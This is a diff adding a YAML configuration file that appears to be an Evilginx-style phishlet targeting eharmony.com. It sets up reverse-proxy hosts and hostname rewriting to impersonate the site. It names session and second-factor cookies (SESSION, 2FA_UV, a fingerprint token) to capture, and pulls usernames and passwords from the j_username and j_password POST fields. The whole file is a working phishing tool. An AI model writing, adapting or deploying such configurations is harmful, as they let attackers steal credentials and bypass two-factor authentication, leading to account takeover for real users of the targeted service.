@@ -1,0 +1,30 @@
+author: '@maliondev'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'tms', orig_sub: 'tms', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: false}
+  # - {phish_sub: 'assets', orig_sub: 'assets', domain: 'nflxext.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.eharmony.com', orig_sub: 'www', domain: 'eharmony.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.eharmony.com', orig_sub: 'tms', domain: 'eharmony.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.eharmony.com'
+    keys: ['2FA_UV']
+  - domain: 'www.eharmony.com'
+    keys: ['SESSION', 'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef']
+
+credentials:
+  username:
+    key: 'j_username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'j_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'eharmony.com'
+  path: '/profile'
